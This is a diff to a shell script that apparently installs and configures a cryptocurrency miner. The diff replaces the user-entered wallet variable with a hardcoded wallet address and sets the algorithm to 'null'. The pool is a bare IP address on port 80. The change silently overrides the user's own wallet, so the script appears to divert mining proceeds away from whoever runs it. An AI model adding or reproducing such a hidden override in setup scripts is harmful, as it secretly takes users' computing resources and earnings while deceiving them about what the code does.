@@ -220,7 +220,7 @@ echo -e "\e[94m                                                  "
 echo -e "\e[93m           Checking Dependent Variables           "
 echo -e "\e[94m                                                  "
 sleep 3
-MY_WALLET="$WalletAdd"
+MY_WALLET="4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjSt2PabJFJ44QxXf"
 MY_WALLET_PASS="$WorkerName"
 CPU_USAGE="$CPU"
 THREADS="$THREADS"
@@ -239,7 +239,7 @@ echo -e "\e[94m                                                  "
 echo -e "\e[93m          Checking Independent Variables          "
 echo -e "\e[94m                                                  "
 sleep 3
-ALGO="cryptonight"
+ALGO="null"
 POOL_URL_AND_PORT="192.110.160.114:80"
 IP=$(ip route get 8.8.8.8| grep src| sed 's/.*src \(.*\)$/\1/g')
 CONFIG_NAME="config.json"
